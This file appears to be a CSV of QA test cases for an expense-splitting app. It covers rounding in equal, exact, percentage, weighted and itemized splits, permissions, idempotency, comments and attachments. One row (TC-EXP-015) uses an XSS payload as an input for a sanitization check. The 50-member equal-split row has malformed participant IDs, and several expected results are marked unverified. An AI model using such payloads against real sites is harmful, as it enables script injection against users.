3. Verify sum of shares equals total","totalAmountMinor=250075 (₹2500.75), participants=50 (₹2,500.75 among 50 (max realistic group size))","Allocation: usr_j=₹50.02, usr_k=₹50.02, usr_h=₹50.02, usr_i=₹50.02, usr_n=₹50.02, usr_o=₹50.02, usr_l=₹50.02, usr_m=₹50.02, usr_b=₹50.02, usr_c=₹50.02, usr_a=₹50.02, usr_f=₹50.02, usr_g=₹50.02, usr_d=₹50.02, usr_e=₹50.02, usr_z=₹50.02, usr_{=₹50.02, usr_x=₹50.02, usr_y=₹50.02, usr_~=₹50.02, usr_=₹50.02, usr_|=₹50.02, usr_}=₹50.02, usr_r=₹50.02, usr_s=₹50.02, usr_p=₹50.01, usr_q=₹50.01, usr_v=₹50.01, usr_w=₹50.01, usr_t=₹50.01, usr_u=₹50.01, usr_=₹50.01, usr_=₹50.01, usr_=₹50.01, usr_=₹50.01, usr_=₹50.01, usr_=₹50.01, usr_=₹50.01, usr_=₹50.01, usr_=₹50.01, usr_=₹50.01, usr_=₹50.01, usr_=₹50.01, usr_=₹50.01, usr_=₹50.01, usr_=₹50.01, usr_=₹50.01, usr_=₹50.01, usr_=₹50.01, usr_=₹50.01. Sum=₹2500.75 (must equal total ₹2500.75). Currency=INR.",Section 3.2 Boundary - 50 members,
TC-SPLIT-EQ-009,Equal Split,Happy Path,High,"Group/friend context with participants usr_p0, usr_p1 exists; expense not yet created.","1. Create expense with totalAmountMinor=100, splitType=equal, participants=['usr_p0', 'usr_p1']
2. Inspect ExpenseShareEntity.owedAmountMinor for each participant
3. Verify sum of shares equals total","totalAmountMinor=100 (₹1.00), participants=2 (₹1.00 among exactly 2 members (minimum group size))","Allocation: usr_p0=₹0.50, usr_p1=₹0.50. Sum=₹1.00 (must equal total ₹1.00). Currency=INR.",Section 3.2 Boundary - minimum participants,
TC-SPLIT-EQ-010,Equal Split,Boundary,Medium,Single-participant context (self-expense),"1. Create expense totalAmountMinor=10001, splitType=equal, participants=[usr_solo]","totalAmountMinor=10001, N=1",Allocation: usr_solo=₹100.01. Sum=₹100.01 (must equal total ₹100.01). Currency=INR.,"Section 3.2 RoundingAllocator with N=1 (trivial case, no remainder distribution needed)",
TC-SPLIT-EQ-011,Equal Split,Rounding,Critical,3-participant group,"1. Create expense totalAmountMinor=3, splitType=equal, participants=[usr_a,usr_b,usr_c]","totalAmountMinor=3 (3 paise), N=3 (exact 3-way tie on fractional remainder 0.333...)","All three fractions tie exactly at 0.333...; tie broken by stableHash(id) ascending. Allocation: usr_b=₹0.01, usr_c=₹0.01, usr_a=₹0.01. Sum=₹0.03 (must equal total ₹0.03). Currency=INR.",Section 3.2 step 6 - deterministic tie-break via stableHash,
TC-SPLIT-EQ-012,Equal Split,Negative,Critical,Group with 3 members,"1. Create expense totalAmountMinor=10000, splitType=equal, participants=[] (empty list)",participants=[],400 Bad Request: cannot compute equal split with zero participants (division by zero in RoundingAllocator weight sum).,Section 3.2 RoundingAllocator - undefined for N=0,
TC-SPLIT-EQ-013,Equal Split,Negative,High,"Group with members A,B,C; D is not a member","1. Create expense splitType=equal, participants=[A,B,D] where D is not a group member",participants includes non-member D,400/403: cannot split among a non-participant; D must first be added via ParticipantEntity/GroupMembershipEntity.,Section 4.2 ParticipantEntity - participant must belong to group,
TC-SPLIT-EQ-014,Equal Split,State-Sequence,High,"Equal-split expense already created and ledger posted among A,B,C","1. Add new member D to the group AFTER the expense was created
2. Verify the existing expense's shares are NOT recalculated retroactively",New member D added post-hoc,"The original ExpenseShareEntity rows for A,B,C remain unchanged; D has no share in that historical expense (splits are immutable once posted, only new expenses include D).",Section 3.5 Balanced Posting Set - event-sourced immutability,
TC-SPLIT-EX-001,Exact Split,Happy Path,Critical,"Group with members A,B,C","1. Create expense totalAmountMinor=10000, splitType=exact, shares={A:4000,B:3000,C:3000}",shares sum to 10000,"201: ExpenseShareEntity created with owedAmountMinor A=4000,B=3000,C=3000; ledger postings balance to zero.",Section 3.3 ExactAmountSplitStrategy,
TC-SPLIT-EX-002,Exact Split,Negative,Critical,"Group with members A,B,C","1. Create expense totalAmountMinor=10000, splitType=exact, shares={A:4000,B:3000,C:2999} (sum=9999)",shares sum to 9999 ≠ 10000,400 Bad Request / thrown Error: 'ExactAmountSplitStrategy enforces sum(amountMinor) === totalMinor'; expense not created.,Section 3.3 - Exact Split: Throws Error if sum ≠ totalMinor,
TC-SPLIT-EX-003,Exact Split,Negative,Critical,"Group with members A,B,C","1. Create expense totalAmountMinor=10000, splitType=exact, shares={A:5000,B:3000,C:3000} (sum=11000, over by 1000)",shares sum to 11000 > 10000,400 Bad Request: sum exceeds totalMinor; must be rejected identically to the under-sum case.,Section 3.3 Exact Split enforcement,
TC-SPLIT-EX-004,Exact Split,Boundary,High,"Group with members A,B","1. Create expense totalAmountMinor=1, splitType=exact, shares={A:1,B:0}","shares={A:1,B:0}","UNVERIFIED — doc doesn't state whether a 0-value share is permitted in Exact split (vs requiring the participant to be omitted); if allowed: 201 with A=1,B=0; confirm with dev.",Section 3.3 Exact Split; Section 4.3 ExpenseShareEntity.owedAmountMinor,
TC-SPLIT-EX-005,Exact Split,Negative,High,"Group with members A,B","1. Create expense totalAmountMinor=10000, splitType=exact, shares={A:-2000,B:12000}",Negative share for A,400 Bad Request: negative individual share amounts must be rejected even though the sum is mathematically correct.,Section 8 DTO Validation - positive integers for minor units,
TC-SPLIT-EX-006,Exact Split,Happy Path,Medium,"Group with members A,B,C,D (4 payers on one expense)","1. Create expense totalAmountMinor=20000 with MULTIPLE payers: ExpensePayerEntity A paid=8000, B paid=12000; splitType=exact shares C=10000,D=10000",Multi-payer + exact split combined,"201: sum(paidAmountMinor)=20000=sum(owedAmountMinor); ledger reflects A:+8000-owed, B:+12000-owed, C:-10000, D:-10000, net sums to 0 across all 4 participants.",Section 4.3 ExpensePayerEntity - multiple payers supported,
TC-SPLIT-EX-007,Exact Split,Negative,Medium,"Group with members A,B,C","1. Create expense totalAmountMinor=10000, splitType=exact, shares include a participant E who is not in this group","shares={A:5000,E:5000}",400/403: E is not a valid ParticipantEntity in this group; expense creation rejected.,Section 4.2 ParticipantEntity scoping,
TC-SPLIT-EX-008,Exact Split,Boundary,Medium,"Group with members A,B","1. Create expense totalAmountMinor=9007199254740991 (Number.MAX_SAFE_INTEGER), splitType=exact, shares={A: same value, B:0}","totalMinor = Number.MAX_SAFE_INTEGER (₹90,071,992,547,409.91)",201 if Number.isInteger check passes at this exact boundary (it is still a safe integer); verify no float precision loss occurs in storage/response serialization.,Section 10 Gap #1 - Integer Minor Units vs JS Number Safety,Known gap: MAX_SAFE_INTEGER boundary explicitly called out in doc
TC-SPLIT-EX-009,Exact Split,Boundary,Critical,"Group with members A,B","1. Create expense totalAmountMinor=9007199254740992 (Number.MAX_SAFE_INTEGER + 1), splitType=exact, shares summing to same value",totalMinor = MAX_SAFE_INTEGER + 1,"UNVERIFIED — doc flags this exact boundary as a risk; behavior beyond MAX_SAFE_INTEGER (precision loss, silent rounding) is not specified; confirm whether a hard validation cap below this value exists.",Section 10 Gap #1,"Known gap: explicitly called out in source doc as a risk area, no cap documented"
TC-SPLIT-EX-010,Exact Split,Negative,Medium,"Group with members A,B","1. Create expense totalAmountMinor=100.5 (non-integer, fractional paise)",totalAmountMinor=100.5,400 Bad Request: Money constructor throws 'Money amount must be stored in integer minor units' — Number.isInteger check fails.,Section 3.1 Money class - integer enforcement,
TC-SPLIT-PCT-001,Percentage Split,Rounding,Critical,"Group with participants usr_a, usr_b, usr_c","1. Create expense totalAmountMinor=10000, splitType=percent, percentages={'usr_a': 50, 'usr_b': 30, 'usr_c': 20} (sums to 100)
2. Verify pre-validation enforces sum=100 at DTO layer
3. Inspect resulting owedAmountMinor per participant","totalAmountMinor=10000, percentages={'usr_a': 50, 'usr_b': 30, 'usr_c': 20} (50/30/20 split of ₹100.00)","DTO validation confirms sum(percent)=100 passes. Internally converted to WeightedShareSplitStrategy with w_i=percent_i/100. Allocation: usr_b=₹30.00, usr_c=₹20.00, usr_a=₹50.00. Sum=₹100.00 (must equal total ₹100.00). Currency=INR.",Section 3.3 Percentage Split - converted to Weighted Split; Section 8 DTO enforces sum=100%,
TC-SPLIT-PCT-002,Percentage Split,Rounding,High,"Group with participants usr_a, usr_b, usr_c","1. Create expense totalAmountMinor=10000, splitType=percent, percentages={'usr_a': 33, 'usr_b': 33, 'usr_c': 34} (sums to 100)
2. Verify pre-validation enforces sum=100 at DTO layer
3. Inspect resulting owedAmountMinor per participant","totalAmountMinor=10000, percentages={'usr_a': 33, 'usr_b': 33, 'usr_c': 34} (33/33/34 split of ₹100.00)","DTO validation confirms sum(percent)=100 passes. Internally converted to WeightedShareSplitStrategy with w_i=percent_i/100. Allocation: usr_b=₹33.00, usr_c=₹34.00, usr_a=₹33.00. Sum=₹100.00 (must equal total ₹100.00). Currency=INR.",Section 3.3 Percentage Split - converted to Weighted Split; Section 8 DTO enforces sum=100%,
TC-SPLIT-PCT-003,Percentage Split,Rounding,High,"Group with participants usr_a, usr_b, usr_c, usr_d","1. Create expense totalAmountMinor=9999, splitType=percent, percentages={'usr_a': 25, 'usr_b': 25, 'usr_c': 25, 'usr_d': 25} (sums to 100)
2. Verify pre-validation enforces sum=100 at DTO layer
3. Inspect resulting owedAmountMinor per participant","totalAmountMinor=9999, percentages={'usr_a': 25, 'usr_b': 25, 'usr_c': 25, 'usr_d': 25} (Equal 25% x4 of ₹99.99 (odd total))","DTO validation confirms sum(percent)=100 passes. Internally converted to WeightedShareSplitStrategy with w_i=percent_i/100. Allocation: usr_b=₹25.00, usr_c=₹25.00, usr_a=₹25.00, usr_d=₹24.99. Sum=₹99.99 (must equal total ₹99.99). Currency=INR.",Section 3.3 Percentage Split - converted to Weighted Split; Section 8 DTO enforces sum=100%,
TC-SPLIT-PCT-004,Percentage Split,Rounding,Medium,"Group with participants usr_a, usr_b","1. Create expense totalAmountMinor=100, splitType=percent, percentages={'usr_a': 1, 'usr_b': 99} (sums to 100)
2. Verify pre-validation enforces sum=100 at DTO layer
3. Inspect resulting owedAmountMinor per participant","totalAmountMinor=100, percentages={'usr_a': 1, 'usr_b': 99} (1%/99% split of ₹1.00 (extreme skew))","DTO validation confirms sum(percent)=100 passes. Internally converted to WeightedShareSplitStrategy with w_i=percent_i/100. Allocation: usr_b=₹0.99, usr_a=₹0.01. Sum=₹1.00 (must equal total ₹1.00). Currency=INR.",Section 3.3 Percentage Split - converted to Weighted Split; Section 8 DTO enforces sum=100%,
TC-SPLIT-PCT-005,Percentage Split,Negative,Critical,"Group with members A,B,C","1. Create expense splitType=percent, percentages={A:50,B:30,C:19} (sums to 99, not 100)",percentages sum=99,400 Bad Request: DTO layer validation 'percentages must sum to 100' rejects request before reaching split calculation.,Section 3.3 - Percentage Split: Pre-validated at DTO layer to sum to 100%,
TC-SPLIT-PCT-006,Percentage Split,Negative,Critical,"Group with members A,B,C","1. Create expense splitType=percent, percentages={A:50,B:30,C:21} (sums to 101, over 100)",percentages sum=101,400 Bad Request: over-100% sum rejected identically to under-100% case.,Section 3.3 Percentage Split DTO validation,
TC-SPLIT-PCT-007,Percentage Split,Boundary,High,"Group with members A,B","1. Create expense splitType=percent, percentages={A:100,B:0}","percentages={A:100,B:0}",UNVERIFIED — doc doesn't state whether a 0% participant is valid (they'd owe nothing but still be listed); expected 201 with B owedAmountMinor=0; confirm with dev.,Section 3.3 Percentage Split,
TC-SPLIT-PCT-008,Percentage Split,Negative,Medium,"Group with members A,B","1. Create expense splitType=percent, percentages={A:-10,B:110}",Negative percentage for A,400 Bad Request: negative percentage values rejected even though sum=100.,Section 8 DTO Input Validation,
TC-SPLIT-PCT-009,Percentage Split,Boundary,Medium,"Group with members A,B,C (fractional percentages allowed?)","1. Create expense splitType=percent, percentages={A:33.33,B:33.33,C:33.34}",Fractional (non-integer) percentages,UNVERIFIED — doc's percent field type not explicitly stated as integer-only; if decimals are accepted sum=100.00 passes; if only integers are accepted this is a 400; confirm allowed precision with dev.,Section 3.3 Percentage Split,
TC-SPLIT-WT-001,Weighted/Share Split,Rounding,Critical,"Group with participants usr_a, usr_b, usr_c","1. Create expense totalAmountMinor=10000, splitType=weight, weights={'usr_a': (2, 1), 'usr_b': (1, 1), 'usr_c': (1, 1)} (numerator/denominator per participant)
2. Inspect owedAmountMinor per participant","totalAmountMinor=10000, weights={'usr_a': (2, 1), 'usr_b': (1, 1), 'usr_c': (1, 1)} (Weights 2:1:1 on ₹100.00)","Allocation: usr_b=₹25.00, usr_c=₹25.00, usr_a=₹50.00. Sum=₹100.00 (must equal total ₹100.00). Currency=INR.",Section 3.3 WeightedShareSplitStrategy,
TC-SPLIT-WT-002,Weighted/Share Split,Rounding,High,"Group with participants usr_a, usr_b","1. Create expense totalAmountMinor=10000, splitType=weight, weights={'usr_a': (3, 1), 'usr_b': (2, 1)} (numerator/denominator per participant)
2. Inspect owedAmountMinor per participant","totalAmountMinor=10000, weights={'usr_a': (3, 1), 'usr_b': (2, 1)} (Weights 3:2 on ₹100.00 (uneven))","Allocation: usr_b=₹40.00, usr_a=₹60.00. Sum=₹100.00 (must equal total ₹100.00). Currency=INR.",Section 3.3 WeightedShareSplitStrategy,
TC-SPLIT-WT-003,Weighted/Share Split,Rounding,High,"Group with participants usr_a, usr_b, usr_c","1. Create expense totalAmountMinor=10007, splitType=weight, weights={'usr_a': (1, 1), 'usr_b': (1, 1), 'usr_c': (1, 1)} (numerator/denominator per participant)
2. Inspect owedAmountMinor per participant","totalAmountMinor=10007, weights={'usr_a': (1, 1), 'usr_b': (1, 1), 'usr_c': (1, 1)} (Equal weights 1:1:1 on odd ₹100.07)","Allocation: usr_b=₹33.36, usr_c=₹33.36, usr_a=₹33.35. Sum=₹100.07 (must equal total ₹100.07). Currency=INR.",Section 3.3 WeightedShareSplitStrategy,
TC-SPLIT-WT-004,Weighted/Share Split,Rounding,Medium,"Group with participants usr_a, usr_b, usr_c","1. Create expense totalAmountMinor=10000, splitType=weight, weights={'usr_a': (1, 2), 'usr_b': (1, 2), 'usr_c': (1, 1)} (numerator/denominator per participant)
2. Inspect owedAmountMinor per participant","totalAmountMinor=10000, weights={'usr_a': (1, 2), 'usr_b': (1, 2), 'usr_c': (1, 1)} (Fractional weights 0.5:0.5:1 on ₹100.00)","Allocation: usr_b=₹25.00, usr_c=₹50.00, usr_a=₹25.00. Sum=₹100.00 (must equal total ₹100.00). Currency=INR.",Section 3.3 WeightedShareSplitStrategy,
TC-SPLIT-WT-005,Weighted/Share Split,Negative,High,"Group with members A,B","1. Create expense splitType=weight, weights={A:0,B:0} (both zero weight)",All weights=0,400 Bad Request: total weight W=0 causes division by zero in RoundingAllocator; must be rejected — 'Requires positive non-zero rational weights' per doc.,Section 3.3 - Weighted Split: Requires positive non-zero rational weights,
TC-SPLIT-WT-006,Weighted/Share Split,Negative,High,"Group with members A,B,C","1. Create expense splitType=weight, weights={A:-1,B:2,C:1}",Negative weight for A,400 Bad Request: negative weights violate the documented positive-non-zero-weight requirement.,Section 3.3 Weighted Split - positive non-zero rational weights required,
TC-SPLIT-WT-007,Weighted/Share Split,Boundary,Medium,"Group with members A,B","1. Create expense splitType=weight, weights={A:1000000,B:1}","Extreme weight skew 1,000,000:1","A receives essentially the full amount, B receives at most 1 minor unit's worth of rounding; verify no overflow/precision error and sum still equals totalMinor exactly.",Section 3.3 Weighted Split - boundary weight ratio,
TC-SPLIT-WT-008,Weighted/Share Split,State-Sequence,Medium,Weighted-split expense already posted,1. Attempt PUT /v1/expenses/:id to change split weights after settlement proof already submitted against original shares,Edit weights post-proof-submission,UNVERIFIED — doc doesn't specify whether editing an expense with an in-flight SettlementIntentEntity is blocked or auto-invalidates the pending settlement; confirm with dev.,Section 5 PUT /v1/expenses/:id; Section 4.5 SettlementIntentEntity,Cross-feature interaction gap: expense edit vs in-flight settlement
TC-SPLIT-ITM-001,Itemized Split,Happy Path,Critical,"Group with members A,B,C; receipt has 3 line items","1. Create expense splitType=itemized with lineItems: [{desc:'Pizza',amountMinor:60000,assignedTo:[A,B]},{desc:'Coke',amountMinor:20000,assignedTo:[C]},{desc:'Fries',amountMinor:20000,assignedTo:[A,B,C]}], subtotal=100000, no tax/tip","3 line items, subtotal=₹1000.00","Pizza (₹600) split equally A/B via RoundingAllocator = ₹300 each. Coke (₹200) fully to C. Fries (₹200) split equally A/B/C via RoundingAllocator = ₹66.67,₹66.67,₹66.66 (or per stableHash tie-break). Total per person: A=300+66.67=366.67 (or 366.66), B=same as A's counterpart, C=200+66.66/67. Sum of all shares = ₹1000.00 exactly.",Section 3.3 Itemized Split - line items assigned to specific users,
TC-SPLIT-ITM-002,Itemized Split,Rounding,Critical,"Group with members A,B; receipt subtotal=₹500.00, tax=₹50.00 (10%), tip=₹75.00 (15%)","1. Create itemized expense: item1 ₹300 assigned to A, item2 ₹200 assigned to B; tax and tip allocated proportionally to item totals","subtotal=50000, tax=5000, tip=7500, total=62500","Tax/tip allocated proportionally: A's proportion=300/500=0.6, B's=200/500=0.4. A's tax share=0.6*5000=3000, tip share=0.6*7500=4500 → A total=30000+3000+4500=37500 (₹375.00). B's tax=2000,tip=3000 → B total=20000+2000+3000=25000 (₹250.00). Sum=37500+25000=62500=total. Exact in this case (no remainder) but verify via RoundingAllocator if amounts don't divide evenly.",Section 3.3 Itemized Split - tax/tip allocated proportionally to item totals; Section 3.3 table 'Complex rounding on tax/tip allocation across items' risk note,
TC-SPLIT-ITM-003,Itemized Split,Rounding,High,"Group with members A,B,C; subtotal=₹100.00 (₹33.33+₹33.33+₹33.34 items), tax=₹10.01 (odd, doesn't divide evenly by proportions)","1. Create itemized expense with 3 items of near-equal value assigned 1:1 to A,B,C respectively, plus a tax amount that produces fractional proportional shares","3 items ~₹33.33 each, tax=1001 paise",Tax allocated proportionally via RoundingAllocator using each participant's item-total as the weight; remainder paisa distributed by stableHash tie-break per documented algorithm; sum of all participants' tax shares must equal exactly 1001 paise.,Section 3.3 Itemized Split rounding risk; Section 3.2 RoundingAllocator reused for proportional tax allocation,
TC-SPLIT-ITM-004,Itemized Split,Negative,High,"Group with members A,B",1. Create itemized expense where sum(lineItem.amountMinor) + tax + tip ≠ declared totalAmountMinor,Line items + tax/tip don't reconcile to total,400 Bad Request: itemized total must reconcile with the sum of components; mismatch rejected before ledger posting.,Section 3.5 Balanced Posting Set - must balance to zero / reconcile,
TC-SPLIT-ITM-005,Itemized Split,Negative,Medium,"Group with members A,B,C","1. Create itemized expense with a line item assignedTo=[] (empty array, no one assigned)",Orphan line item with no assignees,"400 Bad Request: every line item must have at least one assignee, or the item's cost is unaccounted for in the balanced ledger.",Section 3.3 Itemized Split,
TC-SPLIT-ITM-006,Itemized Split - Line Item Cap,Boundary,Medium,"Group with members A,B",1. Create itemized expense with 101 line items (Question Log Q2 suggests a cap of ~100 may be needed but is not yet enforced),101 line items,UNVERIFIED — Question Log Q2 explicitly flags that no max line-item cap is currently documented/enforced; test to confirm whether 101 items is accepted (current behavior) or rejected (if cap has since been added); flag for dev clarification either way.,Section 11 Question Log Q2 - max line items per receipt,Directly from source doc's open Question Log
TC-SPLIT-ITM-007,Itemized Split via OCR,Happy Path,High,"OCR_PROVIDER_DRIVER=tesseract; clear, well-lit photo of a simple 3-item receipt uploaded","1. POST receipt image to receipts-capture endpoint
2. Verify Tesseract.js OCR extracts line items and totals
3. Confirm extracted line items pre-populate the itemized split form",Receipt image with 3 clearly printed items,200: OCR extracts item descriptions + amounts with reasonable accuracy; extracted totals available for the itemized split flow; user can adjust before confirming.,Section 6 Integration #6 Receipt OCR - Tesseract.js,
TC-SPLIT-ITM-008,Itemized Split via OCR,Negative,Medium,OCR_PROVIDER_DRIVER=noop (default),1. POST receipt image to receipts-capture endpoint with noop OCR driver active,OCR_PROVIDER_DRIVER=noop,200: attachment stored successfully but no line items are auto-extracted (no-op driver returns empty/null result); user must enter itemized split manually.,Section 1 env var OCR_PROVIDER_DRIVER=noop default,
TC-SPLIT-ITM-009,Itemized Split via OCR,Negative,Medium,OCR_PROVIDER_DRIVER=tesseract,1. POST a blurry/illegible or non-receipt image (e.g. a photo of a cat) to receipts-capture endpoint,Non-receipt / illegible image,200: attachment stored; OCR extraction returns low-confidence or empty result rather than fabricated line items; UI should not silently populate incorrect amounts.,Section 6 Receipt OCR; Section 11 Question Log Q2 - OCR memory/quality risk,
TC-EXP-001,Expense CRUD,Happy Path,Critical,"Group with members A,B,C; A has expense_create permission","1. POST /v1/groups/:id/expenses with description='Dinner', totalAmountMinor=15000, splitType=equal, payer=A","totalAmountMinor=15000, splitType=equal","201: EXPENSE_CREATED event appended to EventStoreEntity; ExpenseProjectionEntity(status=active,version=1) created; balanced LedgerPostingEntity rows posted; GroupBalanceProjectionEntity updated synchronously for A,B,C.",Section 5 POST /v1/groups/:id/expenses,
TC-EXP-002,Expense CRUD,Permission,Critical,"Group with owner A, admin B, member C, viewer D",1. Viewer D attempts POST /v1/groups/:id/expenses,Actor=viewer D,403 Forbidden: expense_create is denied for Viewer role per Authorization Matrix.,Section 7 Authorization Matrix - expense_create ❌Viewer,
TC-EXP-003,Expense CRUD,Happy Path,High,Group with paginated list of 120 expenses,1. GET /v1/groups/:id/expenses?page=1&limit=20,"page=1, limit=20",200: returns exactly 20 expenses (or documented default page size) with pagination metadata (totalCount≈120).,Section 5 GET /v1/groups/:id/expenses,
TC-EXP-004,Expense CRUD,Boundary,Medium,Group with 0 expenses (freshly created),1. GET /v1/groups/:id/expenses,Empty group,"200: returns empty array [], not an error, with totalCount=0.",Section 5 GET /v1/groups/:id/expenses,
TC-EXP-005,Expense Edit,Happy Path,Critical,"Expense created by member A (owedAmountMinor A=5000,B=5000)",1. A calls PUT /v1/expenses/:id changing totalAmountMinor to 12000 and recalculating equal split,New totalAmountMinor=12000,"200: original ledger postings are reversed (opposite-sign entries appended to EventStoreEntity as new version event), new postings for 12000 (A=6000,B=6000) applied; ExpenseProjectionEntity.version incremented to 2; net balances reflect only the NEW amounts (old ones fully reversed, not double-counted).",Section 5 PUT /v1/expenses/:id,
TC-EXP-006,Expense Edit,Permission,Critical,Expense created by member A; member C (not creator) attempts edit; C does not have expense_edit_any,1. Member C calls PUT /v1/expenses/:id (expense created by A),"Actor=member C, expense owner=A",403 Forbidden: expense_edit_own only covers the creator's own expenses; Member role lacks expense_edit_any per Authorization Matrix.,Section 7 Authorization Matrix - expense_edit_own ✅ (own only) / expense_edit_any ❌Member,
TC-EXP-007,Expense Edit,Permission,High,Expense created by member C; group admin B attempts edit,"1. Admin B calls PUT /v1/expenses/:id (expense created by C, not B)","Actor=admin B, expense owner=C","200: Admin has expense_edit_any=✅ per Authorization Matrix, so B can edit any member's expense regardless of ownership.",Section 7 Authorization Matrix - expense_edit_any ✅Admin,
TC-EXP-008,Expense Delete/Void,Happy Path,Critical,"Active expense exists, posted to ledger",1. Admin calls DELETE /v1/expenses/:id,expenseId,200: EXPENSE_VOIDED event appended; ExpenseProjectionEntity.status set to 'voided'; reversing LedgerPostingEntity entries posted (sum still balances to zero); GroupBalanceProjectionEntity updated to remove the voided expense's effect.,Section 5 DELETE /v1/expenses/:id,
TC-EXP-009,Expense Delete/Void,Permission,Critical,Active expense created by member C; member C attempts to void their own expense,1. Member C calls DELETE /v1/expenses/:id on their own expense,Actor=member C (creator),403 Forbidden: expense_void permission is Owner/Admin only per Authorization Matrix; even the creator (as plain Member) cannot void.,Section 7 Authorization Matrix - expense_void ❌Member (even own),
TC-EXP-010,Expense Delete/Void,State-Sequence,Critical,Expense already voided (status=voided),1. Admin attempts DELETE /v1/expenses/:id on an already-voided expense,Already-voided expenseId,409 Conflict / 400: cannot void an already-voided expense; must not post duplicate reversing entries.,Section 4.3 ExpenseProjectionEntity.status enum,
TC-EXP-011,Expense Delete/Void,State-Sequence,Critical,Expense has a CONFIRMED settlement (SettlementIntentEntity state=confirmed) referencing it via sourceId,1. Admin attempts to void an expense that has already been fully settled,"Settled expense, void attempt",UNVERIFIED — doc doesn't specify whether voiding a settled expense is blocked or triggers a cascading settlement reversal/dispute; expected (best-guess) 409 Conflict requiring the settlement be reversed first; confirm with dev.,Section 4.5 SettlementIntentEntity; Section 5 DELETE /v1/expenses/:id,Cross-feature interaction gap: void vs already-settled expense
TC-EXP-012,Expense Delete/Void,Negative,High,Expense ID does not exist,1. DELETE /v1/expenses/00000000-0000-0000-0000-000000000000,Non-existent UUID,404 Not Found.,Section 5 DELETE /v1/expenses/:id,
TC-EXP-013,Expense Edit,Negative,High,Expense ID does not exist,1. PUT /v1/expenses/00000000-0000-0000-0000-000000000000 with valid body,Non-existent UUID,404 Not Found.,Section 5 PUT /v1/expenses/:id,
TC-EXP-014,Expense Create,Negative,High,Group exists,1. POST /v1/groups/:id/expenses with description missing entirely,description omitted,400 Bad Request: DTO validation requires description field.,Section 8 DTO Input Validation,
TC-EXP-015,Expense Create,Negative,Medium,Group exists,1. POST /v1/groups/:id/expenses with description='<img src=x onerror=alert(1)>',description=<img src=x onerror=alert(1)>,"201 (stored as literal text) or 400 if sanitization rejects it; in either case, the string must NEVER be rendered/executed unescaped by any client consuming the API — verify raw storage, no execution.",Section 8 DTO Input Validation,XSS injection defense check
TC-EXP-016,Expense Create,Boundary,Low,Group exists,"1. POST /v1/groups/:id/expenses with description = 10,000-character string",description = 'D'*10000,UNVERIFIED — max description length not documented; expect 400 if a limit exists; confirm with dev.,Section 8 DTO Input Validation,
TC-EXP-017,Expense Create,Boundary,Medium,Group exists,1. POST /v1/groups/:id/expenses with expenseDate = a future date (e.g. year 2099),expenseDate=2099-01-01,UNVERIFIED — doc doesn't state whether future-dated expenses are permitted or rejected; expected (best-guess) 201 allowed since recurring expense scheduling implies future dates are handled elsewhere; confirm with dev.,Section 4.3 ExpenseProjectionEntity.expenseDate,
TC-EXP-018,Expense Create,Boundary,Medium,Group exists,1. POST /v1/groups/:id/expenses with expenseDate = year 1900 (very old date),expenseDate=1900-01-01,UNVERIFIED — no documented minimum date; expect 201 accepted; confirm with dev whether a sane minimum bound is enforced.,Section 4.3 ExpenseProjectionEntity.expenseDate,
TC-EXP-019,Expense Create - Category,Boundary,Low,Group exists,1. POST /v1/groups/:id/expenses with category='' (empty) and again with category omitted,category='' then omitted,201 in both cases: category appears optional/free-text per schema (no enum documented); stored as empty string or null respectively.,Section 4.3 ExpenseProjectionEntity.category,
TC-EXP-020,Expense Create - Idempotency,Negative,Critical,Group exists; client about to double-submit due to network retry,"1. POST /v1/groups/:id/expenses with header x-idempotency-key='abc-123' and full expense body
2. Immediately POST the exact same request again with the SAME x-idempotency-key='abc-123'","Duplicate request, same idempotency key",201 on first call; second call returns the SAME 201 response (same expenseId) WITHOUT creating a second ExpenseProjectionEntity or duplicate ledger postings — IdempotencyInterceptor short-circuits via IdempotencyRecordEntity.,Section 8 Idempotency Control - x-idempotency-key / IdempotencyInterceptor,
TC-EXP-021,Expense Create - Idempotency,Negative,High,Group exists,1. POST /v1/groups/:id/expenses TWICE with the SAME body but DIFFERENT (or missing) x-idempotency-key each time,"Same body, different/absent idempotency key","Both requests succeed independently: TWO separate ExpenseProjectionEntity rows created and TWO sets of ledger postings — idempotency is keyed strictly on the header, not on body content.",Section 8 Idempotency Control,
TC-EXP-022,Expense Comments,Happy Path,Medium,Group with member A; expense exists,1. POST comment on expense with text='Can we split this differently?',text='Can we split this differently?',"201: comment created and associated with the expense, visible to all group members in the comment thread.",Section 2 Expense Comments,
TC-EXP-023,Expense Comments,Permission,High,Non-member X attempts to comment on a group's expense,1. POST comment as non-member X,Actor=non-member X,403 Forbidden: comments require Group Member permission per Feature Inventory.,Section 2 Expense Comments - Group Member permission required,
TC-EXP-024,Expense Comments,Happy Path,Low,"Comment exists, authored by A",1. A calls DELETE on their own comment (soft delete),commentId,200: comment marked soft-deleted (not physically removed); no longer shown in default thread view but preserved for audit.,Section 2 Expense Comments - comment creation and soft deletion,
TC-EXP-025,Expense Comments,Permission,Medium,"Comment exists, authored by A; member B (not author, not admin) attempts delete",1. B calls DELETE on A's comment,"Actor=B, comment author=A","UNVERIFIED — doc doesn't specify who besides the author can delete a comment (e.g. Admin moderation); expected 403 for a non-author, non-admin member; confirm with dev.",Section 2 Expense Comments,
TC-EXP-026,Expense Comments,Negative,Low,Expense exists,1. POST comment with text='' (empty),text='',400 Bad Request: empty comment text rejected by DTO validation.,Section 8 DTO Input Validation,
TC-ATTACH-001,Attachments,Happy Path,High,"OBJECT_STORAGE_DRIVER=s3, valid S3_BUCKET/S3_ENDPOINT configured","1. Request a presigned upload URL for a receipt image
2. PUT the image bytes directly to the presigned URL
3. Confirm attachment via API, linking attachmentId to the expense","JPEG receipt image, ~2MB",200: presigned URL generated with correct expiry; upload succeeds directly to S3/MinIO; attachment record links to ExpenseProjectionEntity/PaymentProofEntity as applicable.,Section 6 Integration #5 Object Storage - presigned URLs,
TC-ATTACH-002,Attachments,Negative,Medium,Presigned URL for upload has expired,"1. Request presigned URL
2. Wait past its expiry
3. Attempt PUT upload using the expired URL",Expired presigned URL,403 Forbidden from the storage provider (S3/MinIO signature verification fails on expired URL); API attachment record must remain unlinked/pending.,Section 6 Object Storage,
TC-ATTACH-003,Attachments,Boundary,Medium,Object storage configured,1. Attempt to upload a 50MB receipt file,50MB file,UNVERIFIED — max attachment file size not documented; expect a size-limit rejection (413 or 400) if a cap exists; confirm with dev.,Section 2 Expense Attachments & Receipts,
